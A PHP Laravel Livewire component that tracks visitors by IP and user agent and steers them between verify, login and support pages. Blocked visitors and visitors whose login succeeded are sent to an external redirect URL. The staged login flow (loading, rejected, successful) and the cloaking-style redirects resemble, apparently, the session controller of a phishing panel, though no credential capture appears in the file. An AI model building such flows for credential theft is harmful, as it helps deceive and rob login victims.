<?php

namespace App\Livewire;

use App\Connection\Status;
use App\Connection\Step;
use App\Models\Connection;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Log;
use Livewire\Component;

class SessionHandler extends Component
{
    protected Request $request;
    public ?Connection $connection;
    public string $route;

    public function __construct()
    {
        $this->request = app(Request::class);
    }

    public function mount()
    {
        $this->connection = self::getConnection($this->request);
        $this->route = $this->request->route()->getName();

        if ($response = $this->validateConnection()) {
            return $response;
        }
    }

    public function render()
    {
        $this->connection ??= self::getConnection($this->request);
        $this->connection->update(['last_seen_at' => now()]);

        if ($response = $this->validateConnection()) {
            return $response;
        }

        return view('livewire.session-handler');
    }

    public function handle()
    {
        if ($response = $this->validateConnection()) {
            return $response;
        }
    }

    protected function validateConnection()
    {
        if ($this->connection->status->is(Status::Blocked)) {
            if ($url = config('app.redirect_url')) {
                return $this->redirect($url);
            }

            abort(403, 'Access denied.');
        }

        if ($this->connection->status->is(Status::Pending) && $this->route !== 'verify') {
            return $this->redirectRoute('verify');
        }

        if ($this->connection->status->is(Status::Allowed)) {
            if ($this->connection->step->is(Step::LoginSuccessful)) {
                if ($url = config('app.redirect_url')) {
                    return $this->redirect($url);
                }

                Log::warning('No redirect URL provided!', [
                    'step' => $this->connection->step->getLabel(),
                    'connection' => $this->connection->getKey(),
                ]);
            }

            if ($this->connection->step->is(Step::Login, Step::LoginLoading, Step::LoginRejected) && $this->route !== 'login') {
                return $this->redirectRoute('login');
            }

            if ($this->connection->step->is(Step::Support) && $this->route !== 'support') {
                return $this->redirectRoute('support');
            }
        }
    }

    public static function getConnection(Request $request): Connection
    {
        if ($key = $request->session()->get('connection')) {
            rescue(function () use ($key, &$connection) {
                $decrypted = Crypt::decryptString($key);
                $connection = Connection::query()->findOrFail($decrypted);
                $connection->update(['last_seen_at' => now()]);
            }, report: false);
        }

        if (! $connection) {
            /** @var Connection $connection */
            $connection = Connection::create([
                'ip' => $request->ip(),
                'user_agent' => $request->userAgent(),
            ]);

            $encrypted = Crypt::encryptString($connection->getKey());
            $request->session()->put('connection', $encrypted);
        }

        return $connection;
    }
}
